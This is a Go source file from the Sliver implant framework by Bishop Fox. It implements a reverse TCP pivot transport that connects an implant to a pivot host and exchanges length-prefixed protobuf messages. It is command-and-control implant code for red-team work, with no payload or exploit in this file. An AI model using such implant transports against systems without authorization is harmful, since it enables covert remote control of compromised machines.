package transports

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

// {{if .Config.TCPPivotc2Enabled}}

import (
	"bytes"
	"encoding/binary"
	"io"
	"net"
	"net/url"
	"strings"
	"sync"

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"github.com/golang/protobuf/proto"

	"github.com/bishopfox/sliver/protobuf/sliverpb"
	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
)

const (
	readBufSizeTCP  = 1024
	writeBufSizeTCP = 1024
)

// tcpPivotConnect - Reverse TCP (Custom RPC pivoting) implant transport.
func tcpPivotConnect(uri *url.URL) (*Connection, error) {
	addr := strings.ReplaceAll(uri.String(), "tcppivot://", "")
	conn, err := net.Dial("tcp", addr)
	if err != nil {
		return nil, err
	}
	send := make(chan *pb.Envelope)
	recv := make(chan *pb.Envelope)
	ctrl := make(chan bool, 1)
	connection := &Connection{
		Send:    send,
		Recv:    recv,
		ctrl:    ctrl,
		tunnels: &map[uint64]*Tunnel{},
		mutex:   &sync.RWMutex{},
		once:    &sync.Once{},
		IsOpen:  true,
		cleanup: func() {
			// {{if .Config.Debug}}
			log.Printf("[tcp-pivot] lost connection, cleanup...")
			// {{end}}
			close(send)
			ctrl <- true
			close(recv)
		},
	}

	go func() {
		defer connection.Cleanup()
		for envelope := range send {
			// {{if .Config.Debug}}
			log.Printf("[tcp-pivot] send loop envelope type %d\n", envelope.Type)
			// {{end}}
			tcpPivoteWriteEnvelope(&conn, envelope)
		}
	}()

	go func() {
		defer connection.Cleanup()
		for {
			envelope, err := tcpPivotReadEnvelope(&conn)
			if err == io.EOF {
				break
			}
			if err == nil {
				recv <- envelope
				// {{if .Config.Debug}}
				log.Printf("[tcp-pivot] Receive loop envelope type %d\n", envelope.Type)
				// {{end}}
			}
		}
	}()

	return connection, nil
}

func tcpPivoteWriteEnvelope(conn *net.Conn, envelope *sliverpb.Envelope) error {
	data, err := proto.Marshal(envelope)
	if err != nil {
		// {{if .Config.Debug}}
		log.Print("[tcppivot] Marshaling error: ", err)
		// {{end}}
		return err
	}
	dataLengthBuf := new(bytes.Buffer)
	binary.Write(dataLengthBuf, binary.LittleEndian, uint32(len(data)))
	_, err = (*conn).Write(dataLengthBuf.Bytes())
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[tcppivot] Error %v and %d\n", err, dataLengthBuf)
		// {{end}}
	}
	totalWritten := 0
	for totalWritten < len(data)-writeBufSizeTCP {
		n, err2 := (*conn).Write(data[totalWritten : totalWritten+writeBufSizeTCP])
		totalWritten += n
		if err2 != nil {
			// {{if .Config.Debug}}
			log.Printf("[tcppivot] Error %v\n", err)
			// {{end}}
		}
	}
	if totalWritten < len(data) {
		missing := len(data) - totalWritten
		_, err := (*conn).Write(data[totalWritten : totalWritten+missing])
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("[tcppivot] Error %v\n", err)
			// {{end}}
		}
	}
	return nil
}

func tcpPivotReadEnvelope(conn *net.Conn) (*sliverpb.Envelope, error) {
	dataLengthBuf := make([]byte, 4)
	_, err := (*conn).Read(dataLengthBuf)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[tcppivot] Error (read msg-length): %v\n", err)
		// {{end}}
		return nil, err
	}
	dataLength := int(binary.LittleEndian.Uint32(dataLengthBuf))
	readBuf := make([]byte, readBufSizeTCP)
	dataBuf := make([]byte, 0)
	totalRead := 0
	for {
		n, err := (*conn).Read(readBuf)
		dataBuf = append(dataBuf, readBuf[:n]...)
		totalRead += n
		if totalRead == dataLength {
			break
		}
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("read error: %s\n", err)
			// {{end}}
			break
		}
	}
	envelope := &sliverpb.Envelope{}
	err = proto.Unmarshal(dataBuf, envelope)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[tcppivot] Unmarshaling envelope error: %v", err)
		// {{end}}
		return &sliverpb.Envelope{}, err
	}
	return envelope, nil
}

// {{end}} -TCPPivotc2Enabled
